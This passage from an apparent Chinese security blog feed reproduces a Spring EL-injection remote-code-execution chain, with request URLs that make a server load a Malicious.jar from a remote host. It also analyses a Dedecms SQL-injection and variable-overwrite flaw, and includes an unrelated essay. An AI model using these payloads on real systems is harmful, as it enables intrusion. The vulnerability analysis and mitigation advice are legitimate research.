&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@page&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html;charset=GBK&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;taglib&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/spring&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;spring&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;利用&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Spring&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;输出&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HelloWorld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
&lt;span class=&quot;o&quot;&gt;&amp;lt;%&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;helloWorld&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;o&quot;&gt;%&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;spring:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;${param['message']}&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;${param['foo']}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;spring:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;font&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;%=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;font&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;红色代码部分为测试的jsp代码。Spring的message标签的作用是，根据code取得消息资源，如果指定的code没有找到任何对应的消息资源，则采用text定义的内容。这里有一个比较奇怪的地方，文章中说在code属性处添加$param[‘message’]代码，通过访问http://target/file? message=${applicationScope}会在页面中打印出服务器环境的相关配置信息。但是，这个地方无论我用什么办法，都无法让它里面的内容显示出来。所以我不得不将测试的内容放到了text属性中（这两个属性都可以执行EL表达式）。&lt;/p&gt;

&lt;p&gt;这个问题虽然有些摸不到头脑，但还是可以接受的，毕竟还是有地方让我做测试。在测试后面的内容才是我噩梦真正的开始！&lt;/p&gt;

&lt;p&gt;在一开始测试时，我并没有按照作者所提供的Glassfish3.1.2.2+Spring3.0.6的环境测试，而是搭建Tomcat6.0+Spring3.0.2的环境。当我在这个环境中，想要通过java.lang.String类调用java方法时出现了问题，提示EL表达式错误。访问http://target/file? message= ${param.foo.replaceAll(“P”,”Q”)}&amp;amp;foo=PPPPP，错误显示如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2014-07/2014-07-25-01.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;纠结了一天多的时间，各种搜索，只能搜索到各大网站对这篇文章的转载，没有一个具体分析的文章。在我就要崩溃的时候，发现了这样一句话“After some research, I learned that the EL 2.2 added support for method invocation.”。马上反应过来，这个特性应该是EL2.2新添加的，而Tomcat6.x是支持EL2.1的，然后果断的换成了支持EL2.2的Tomcat7.0。依旧访问那个url，结果如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2014-07/2014-07-25-02.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;什么都没有！到底执行了没:(。又是崩溃了大半天，最后不得不乖乖的按照文章中环境进行搭建。这次终于成功了，不容易啊！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2014-07/2014-07-25-03.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x03-代码执行技术细节&quot;&gt;0x03 代码执行技术细节&lt;/h3&gt;

&lt;p&gt;通过上一章最后测试的结果，我们不难看出，在一定的环境下，我们是可以通过EL表达式来调用java代码的。但是由于限制条件，我们能够做的事情也是很有限的。不过，DanAmodio和他的朋友在不断的努力下，终于找到了一个，可以使它执行任意代码的方法。&lt;/p&gt;

&lt;p&gt;他们想到通过java的反射机制，来动态的加载一些类和方法。但是，很多的强大的类（如：Runtime）的newinstance方法是不允许被调用的，没有办法对它们进行初始化，也就是说，不能直接的调用这些强大的类和方法。&lt;/p&gt;

&lt;p&gt;后来，他们发现了URLClassLoader这个类提供了newinstance这个方法。这个方法是可以动态加载远程代码的类，这样新的利用方法就出炉了！
首先在我们另一台服务器上放置编译如下代码的jar文件：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
	   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Win&lt;/span&gt;
           &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
           &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后我们通过EL表达式创建一个数组（URLClassLoader的构造函数需要URL数组作为参数），存放在session中，url为http://target/file? message=${pageContext.request.getSession().setAttribute(“arr”,”“.getClass().forName(“java.util.ArrayList”).newInstance())}。&lt;/p&gt;

&lt;p&gt;下一步我们通过URI提供的create方法，可以创建一个URL实例，我们把这个实例保存在刚刚创建的数组中，url为http://target/file?message= ${pageContext.request.getSession().getAttribute(“arr”).add(pageContext.getServletContext().getResource(“/”).toURI().create(“http://serverip/Malicious.jar”).toURL())}。&lt;/p&gt;

&lt;p&gt;Malicious.jar文件就是我们之前保存在另一台服务器中的jar文件。EL表达式中的PageContext类中getClassLoader方法得到的对象的父类便是URLClassLoader，所以，我们便可以调用newInstance方法了，url为http://target/file?message= ${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute(“arr”).toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass(“Malicious”).newInstance()}。&lt;/p&gt;

&lt;p&gt;来看下效果图吧，嘿嘿&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2014-07/2014-07-25-03.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x04-总结&quot;&gt;0x04 总结&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;这个问题利用的环境，在目前看来是只有Glassfish3.1.2.2+Spring3.0.6及其之前版本环境可以实现。从理论上来看应该只要服务端支持EL2.2就可以实现，但是不知道什么原因Tomcat7.0虽然支持EL2.2，但是却没有得到我们预想中的效果。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在测试过程中，遇到了一个比较低级的错误，就是编译jar 的java版本与服务端的java版本不符，导致代码无法成功执行。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对于这种问题的防护，我们给出的建议是将Spring升级到3.1以上版本，因为这些新版本默认是将jsp的EL表达式支持关闭的。如果不能升级到3.0.6以上版本，请在web.xml中设置springJspExpressionSupport的参数为false，如下示例：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;Spring Expression Language Support&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;springJspExpressionSupport&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;另外即使你使用了Spring3.1以上版本，也要留心这个问题，因为它只是默认关闭了EL表达式的支持，而并不是修补了这个问题，不小心的配置很有可能会使这个问题死灰复燃的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;本篇文章中虽然没有在Tomcat环境中测试成功，但并不代码这个问题不会在这种环境中出现，我们会继续跟踪这个问题。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

</content>
 </entry>
 
 <entry>
   <title>互联网时代，我们需要什么</title>
   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/03/16/%E4%BA%92%E8%81%94%E7%BD%91%E6%97%B6%E4%BB%A3-%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88.html"/>
   <updated>2014-03-16T10:29:26+08:00</updated>
   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/03/16/互联网时代，我们需要什么</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/3f18819bgw1eehh01b0c6j20vg0fnq8n.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;无论我们用不用电脑，上不上网，或者承不承认，我们现在的生活已经实实在在的处在了互联网时代。&lt;/p&gt;

&lt;p&gt;对于互联网时代，我按照自己的体验以及身边人的行为，将它分为了三个阶段，分别是：启蒙阶段，爆炸阶段，理性阶段。下面我尽量用简短的文字来解释这几个阶段的定义。&lt;/p&gt;

&lt;!--more--&gt;

&lt;blockquote&gt;
  &lt;p&gt;启蒙阶段：互联网诞生之初，重度互联网用户以科研人员、中小学生为主，行为以资料查找，游戏娱乐为主。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;爆炸阶段：以搜索引擎出现为始，社交网络、移动智能设备出现为催化剂，重度用户扩展为所有使用只能电子设备的人。如果，仅以此作为这个阶段的定义，理性阶段则也属于这个阶段，所以，需要添加另一条定义——大多数互联网重度用户的行为集中于游戏娱乐和非理性获取信息（即：将互联网信息按照阅读传统媒体信息的方式吸收）。相对于理性阶段，此阶段也可称之为非理性阶段。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;理性阶段：以大多数互联网使用者的思考能力、信息获取能力大幅提升为划分，互联网时代恢复理性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;好了，各位睡觉的同学醒一醒，我们要开始进入主题了（我戳，别他喵的打呼噜了行不-_-#）。&lt;/p&gt;

&lt;p&gt;从上面的定义对比我们身边的大部分人来看，我们任然处于爆炸阶段。什么？你不服？好吧，给你看看我的社交平台都有些什么：QQ空间充斥各种无聊的心灵鸡汤，一眼就能看出是假消息的新闻或者所谓的知识，原创内容出了晒生活几乎为零；朋友圈同上；人人同上。&lt;/p&gt;

&lt;p&gt;为什么会这样？很简单，大多数人的大脑被四面八方涌来的信息撑爆了，失去了思考能力，也失去了自我，成为了一直不折不扣的网络僵尸。对！就是网络僵尸，因为他们已经完全被这些信息所操控，失去了自己的思想。&lt;/p&gt;

&lt;p&gt;那要怎么样才能不失去自己的思想？答案其实就在理性阶段的定义中，提升思考能力和信息获取能力。&lt;/p&gt;

&lt;p&gt;信息获取能力提升需要满足以下几点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;足够自我认知，即我需要什么样的信息，这些信息要怎么对待。以我微博为例，我所关注的人基本上以行业相关人员（工作相关），同事（公司事宜相关），同学、朋友（聊天交际）和几个比较关心的艺人（娱乐）。从每类关注后面的括号就可以知道我关注他们的目的，然后就可以以这个目的来确定是否对某个人是否关注了。比如：行业相关人员，每天发一些无关痛痒的信息刷屏，这种情况我一般都是果断取关（关于我是如何玩微博的，就不在这里细说了，改天发篇关于这个文章^_^）。&lt;/li&gt;
  &lt;li&gt;快速的信息筛选能力，通过自我认知，我们能够捕获到我们所关注几个领域的信息，下一步就可以从这些领域信息中提取我们所感兴趣的具体事件。打个比方来说，领域信息就像是新闻网站上，体育、娱乐、政治这样的分类，而具体事件，就是这些分类里面的新闻了。所以，通过像看报纸一样，通过快速浏览标题或者目录，我们就可以在大量的信息中筛选出自己感兴趣的信息，或者也可以说是要深入学习与跟踪的信息。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;简单来说，信息获取就是要明确自己所要汲取目标信息，无论工作、交际还是娱乐，一定要确定你此时此景要选择哪个分类。我在互联网上信息的获取基本上是工作占到80%、交际10%到20%、娱乐10%以下，如果你不想成为僵尸最好离娱乐，尤其是八卦新闻（包括政治）远一点。&lt;/p&gt;

&lt;p&gt;思考能力的提升，就是要不断的去甄别获取的信息，从客观的角度思考问题背后的本质和信息发布者的本意。这有点像是语文考试中的阅读理解，作者为什么会这么写，不过不同的是我们有更多的相关信息可以作为参考。&lt;strong&gt;思考能力的重要性要远远大于信息获取能力，甚至也可以说信息获取能力是思考能力的一个分支。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##结语&lt;/p&gt;

&lt;p&gt;在互联网时代，我们每天所获得得信息要比六七十年代的人一年所获的信息还要大，如何真正的利用好这些信息，是当前我们所需要思考和实践的。思考在这个时代已经成为了必备技能了，而在我泱泱天朝的愚民黔首制度和教育环境下，拔出余毒获取这项生存技能，也变的极其重要了。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Dedecms buy_action.php SQL注入漏洞分析</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms-buy_action.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
   <updated>2014-03-04T21:26:50+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/03/04/Dedecms＋buy_action.php＋SQL注入漏洞分析</id>
   <content type="html">&lt;p&gt;#0x01 补丁对比
通过对比源码和2月25日补丁发现被改动的文件有三个，buy_action.php、uploadsafe.inc.php和sys_info.htm。&lt;/p&gt;

&lt;p&gt;sys_info.htm只是添加了一个重置cfg_cookie_encode的代码，而且是静态文件，可以忽略掉。uploadsafe.inc.php是另外一个注入漏洞的修补,所以只剩下buy_action.php文件，下面我们来看下发生变化的地方：&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;变化前&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/**
 *  加密函数
 *
 * @access    public
 * @param     string  $string  字符串
 * @param     string  $action  操作
 * @return    string
 */
function mchStrCode($string,$action='ENCODE')
{
    $key    = substr(md5($_SERVER[&quot;HTTP_USER_AGENT&quot;].$GLOBALS['cfg_cookie_encode']),8,18);
    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
    $len    = strlen($key);
    $code    = '';
    for($i=0; $i&lt;span class=&quot;nt&quot;&gt;&amp;lt;strlen&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;k        =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;code&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;code =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$action&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DECODE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;变化后&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/**
 *  加密函数
 *
 * @access    public
 * @param     string  $string  字符串
 * @param     string  $operation  操作
 * @return    string
 */
function mchStrCode($string, $operation = 'ENCODE') 
{
    $key_length = 4;
    $expiry = 0;
    $key = md5($GLOBALS['cfg_cookie_encode']);
    $fixedkey = md5($key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));

    $i = 0; $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; $string_length; $i++){
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &amp;gt; 0) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; substr($result, 10, 16) == substr(md5(substr($result, 26).$egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由此我们可以断定，这个漏洞应该是由于mchStrCode这个编码方法造成的。在读这个函数时发现，如果在我们知道cfg_cookie_encode的情况下，被编码字符串是可以被逆推出来的。&lt;/p&gt;

&lt;p&gt;因此，我们可以初步断定，在某个使用这个编码函数进行解码的地方，解码后没有进行任何的校验和过滤，便将内容传入到SQL语句中，并且用户可以控制进入编码函数进行解码的字符串，从而导致SQL注入的产生。&lt;/p&gt;

&lt;p&gt;#0x02 原理分析&lt;/p&gt;

&lt;p&gt;这个问题出现在buy_action.php文件的开始部分，相关代码如下：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//省略部分代码
if(isset($pd_encode) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; isset($pd_verify) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify)
{
    parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
    foreach($mch_Post as $k =&amp;gt; $v) $$k = $v;*］
    $row  = $dsql-&amp;gt;GetOne(&quot;SELECT * FROM #@__member_operation WHERE mid='$mid' And sta=0 AND product='$product'&quot;);
    if(!isset($row['buyid']))
    {
        ShowMsg(&quot;请不要重复提交表单!&quot;, 'javascript:;');
        exit();
    }
    if(!isset($paytype))
    {
        ShowMsg(&quot;请选择支付方式!&quot;, 'javascript:;');
        exit(); 
    }
    $buyid = $row['buyid'];

}//省略部分代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们重点来看if语句开始时的三行代码，mchStrCode是我们在上一小节通过对比补丁发现变化的函数。也就是说这个函数可以编码或者解码，用户提交的数据，而且$pd_encode也是我们可以控制的变量。&lt;/p&gt;

&lt;p&gt;parse_str方法将解码后$pd_encode中的变量放到$mch_Post数组中，之后的foreach语句存在明显的变量覆盖，将$mch_Post中的key定义为变量，同时将key所对应的value赋予该变量。然后，再向下就是执行SQL查询了。&lt;/p&gt;

&lt;p&gt;在这个过程中存在一个明显的疏忽是，没有对定义的key进行检查，导致攻击者可以通过mschStrCode编码攻击代码，绕过GPC和其他过滤机制，使攻击代码直达目标。&lt;/p&gt;

&lt;p&gt;其实如果从漏洞成因的角度来看，这属于全局变量覆盖漏洞，而非SQL注入漏洞。&lt;/p&gt;

&lt;p&gt;#0x03 利用思路
漏洞原理比较简单，但是利用起来还是有很大的难度的，从我实现的过程来看，具体的绊脚石有两个：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;如果开启GPC，parse_str依然会对变量值中的特殊字符进行转义，仍然无法绕过。&lt;/li&gt;
  &lt;li&gt;mchStrCode这个函数的编码过程中需要知道网站预设的cfg_cookie_encode，而这个内容在用户界面只可以获取它的MD5值。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第一个问题解决很简单，虽然$mid和$product被单引号封闭，但是考虑到我们可以利用这个漏洞进行全局变量覆盖，我们可以直接覆盖全局变量cfg_dbprefix，将SQL注入语句插入到from后。也就是说我们可以通过覆盖表前缀变量，将SQL注入语句放置在from关键字后面。&lt;/p&gt;

&lt;p&gt;第二个问题就有很大的难度，虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，在最坏的情况下要跑超过20天的时间。&lt;/p&gt;

&lt;p&gt;之后在想这个漏洞时，我想到那肯定是在什么地方可以使用mchStrCode加密可控参数，并且能够返回到页面中。&lt;/p&gt;

